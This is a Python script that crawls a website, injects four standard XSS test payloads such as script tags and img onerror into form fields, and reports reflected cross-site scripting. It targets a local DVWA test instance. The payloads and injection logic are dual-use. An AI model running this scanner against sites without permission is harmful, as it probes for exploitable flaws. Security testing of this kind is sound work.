import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

# --- CONFIGURATION ---
# Simple test payloads targeting different contexts (HTML, attribute, script)
PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "javascript:alert(1)",
    "<img src=x onerror=alert(1)>"
]

# Track visited URLs to prevent infinite loops during crawling
visited_urls = set()
vulnerabilities = []

def crawl_and_extract_links(target_url, base_domain):
    """Finds all internal links on a page to build a crawl queue."""
    links = set()
    try:
        response = requests.get(target_url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        for anchor in soup.find_all('a', href=True):
            href = anchor['href']
            full_url = urljoin(target_url, href)
            # Ensure we only stay within the allowed target domain
            if urlparse(full_url).netloc == base_domain:
                links.add(full_url)
    except requests.RequestException as e:
        print(f"[-] Error crawling {target_url}: {e}")
    return links

def get_page_forms(url):
    """Extracts all forms from a given URL."""
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, "html.parser")
        return soup.find_all("form")
    except requests.RequestException:
        return []

def scan_form(form, url, payload):
    """Injects a payload into a form and checks if it reflects in the response."""
    action = form.attrs.get("action")
    post_url = urljoin(url, action)
    method = form.attrs.get("method", "get").lower()
    
    inputs_data = {}
    for input_tag in form.find_all(["input", "textarea"]):
        input_name = input_tag.attrs.get("name")
        input_type = input_tag.attrs.get("type", "text")
        input_value = input_tag.attrs.get("value", "")
        
        if input_type == "text" or input_type == "search":
            inputs_data[input_name] = payload
        elif input_name:
            inputs_data[input_name] = input_value

    try:
        if method == "post":
            res = requests.post(post_url, data=inputs_data, timeout=5)
        else:
            res = requests.get(post_url, params=inputs_data, timeout=5)
            
        if payload in res.text:
            return True, post_url, method, inputs_data
    except requests.RequestException:
        pass
    return False, None, None, None

def generate_report(filename="xss_report.txt"):
    """Saves discovered vulnerabilities to a text file."""
    with open(filename, "w") as f:
        f.write("=========================================\n")
        f.write("        REFLECTED XSS SCAN REPORT        \n")
        f.write("=========================================\n\n")
        if not vulnerabilities:
            f.write("No vulnerabilities found. Good sanitization detected!\n")
        else:
            for vuln in vulnerabilities:
                f.write(f"[!] VULNERABILITY DETECTED\n")
                f.write(f"    Target URL: {vuln['url']}\n")
                f.write(f"    Method:     {vuln['method'].upper()}\n")
                f.write(f"    Payload:    {vuln['payload']}\n")
                f.write(f"    Parameters sent: {vuln['data']}\n")
                f.write("-" * 40 + "\n")
    print(f"\n[+] Scanning complete. Report saved to {filename}")

def start_scanner(start_url, max_depth=2):
    """Main loop to crawl and test targets."""
    base_domain = urlparse(start_url).netloc
    queue = {start_url}
    
    print(f"[*] Starting scan on target domain: {base_domain}\n")

    for _ in range(max_depth):
        if not queue:
            break
        next_queue = set()
        
        for url in queue:
            if url in visited_urls:
                continue
            print(f"[*] Auditing page: {url}")
            visited_urls.add(url)
            
            # 1. Discover more links
            discovered_links = crawl_and_extract_links(url, base_domain)
            next_queue.update(discovered_links)
            
            # 2. Extract forms and test payloads
            forms = get_page_forms(url)
            print(f"    [i] Found {len(forms)} form(s). Testing payloads...")
            
            for form in forms:
                for payload in PAYLOADS:
                    is_vulnerable, vuln_url, method, sent_data = scan_form(form, url, payload)
                    if is_vulnerable:
                        print(f"    [!] Alert: Reflected XSS found with payload: {payload}")
                        vulnerabilities.append({
                            "url": vuln_url,
                            "method": method,
                            "payload": payload,
                            "data": sent_data
                        })
                        break # Move to next form if this one is proven vulnerable
                        
        queue = next_queue

    generate_report()

if __name__ == "__main__":
    # Change this to your local DVWA / Mutillidae instance or permitted test bed
    TARGET = "http://localhost:8080/DVWA/vulnerabilities/xss_r/" 
    
    # Note: If testing DVWA, you'll need to pass session cookies to requests.
    # For a completely open local test bed, just run it straight:
    start_scanner(TARGET)